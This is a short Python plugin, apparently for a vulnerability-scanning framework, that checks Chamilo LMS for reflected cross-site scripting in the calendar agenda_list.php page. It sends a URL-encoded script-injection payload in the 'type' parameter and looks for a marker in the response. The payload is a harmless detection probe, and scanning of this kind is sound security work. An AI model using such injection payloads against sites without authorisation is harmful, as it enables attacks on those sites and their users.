# !/usr/bin/dev python
# -*- coding:utf-8 -*-

#import re

"""
reference:
http://www.beebeeto.com/pdb/poc-2015-0068/
"""


def assign(service, arg):
    if service == "chamilo-lms":
        return True, arg
    pass


def audit(arg):
    verify_url = arg + '/main/calendar/agenda_list.php'
    payload = '?type=personal%27%3E%3Cscript%3Exss-vulnerable%281%29%3C%2fscript%3E%3C%21--'
    code, head, res, _, _ = curl.curl(verify_url + payload)
    #print '[*] Request URL: ' + verify_url + payload
    if code == 200 and 'xss-vulnerable' in res:
        return security_info(verify_url + payload)
    pass


if __name__ == "__main__":
    from dummy import *
    audit(assign('chamilo-lms','http://www.example.com/')[1])
